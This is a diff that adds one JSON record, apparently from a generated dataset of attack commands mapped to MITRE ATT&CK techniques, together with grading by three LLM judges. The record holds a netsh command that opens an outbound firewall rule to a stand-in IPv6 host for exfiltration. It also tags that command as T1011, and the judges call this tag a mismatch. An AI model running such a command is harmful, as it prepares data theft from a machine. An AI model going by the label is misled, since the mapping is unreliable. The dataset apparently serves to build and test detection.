@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
+  "explanation": "Adds a narrowly scoped outbound firewall rule to allow IPv6 TCP egress to a specific high port/host used for alternate-medium exfiltration (T1011).",
+  "rationale_steps": [
+    "Open only the exact IPv6 destination and high TCP port needed for exfiltration.",
+    "Minimize side effects by scoping to a single remote IP and port.",
+    "Permit exfil over a non-standard IPv6 path unlikely to be blocked by default."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-53a96244",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid netsh advfirewall syntax with balanced quoting and correct parameters for an outbound IPv6 TCP rule.",
+        "semantic_score": 1,
+        "semantic_justification": "The command only creates a network egress rule (requiring admin rights not provided) and is unrelated to exfiltration over a physical medium (T1011).",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:44:29.263120Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for the netsh advfirewall firewall add rule command, including all required parameters with correct formatting and quoting.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly creates a firewall rule to allow outbound traffic, it doesn't directly implement T1011 (exfiltration over physical medium) as claimed, but rather creates network infrastructure that could potentially support other exfiltration techniques.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:44:32.457895Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax, balanced quotes, and correct attribute formats for `netsh advfirewall firewall add rule`.",
+        "semantic_score": 1,
+        "semantic_justification": "The command facilitates network egress, which fundamentally contradicts the definition of T1011 (Exfiltration Over Physical Medium), and incorrectly claims 'None' for privileges as firewall rule modification requires administrative rights.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:44:40.142936Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
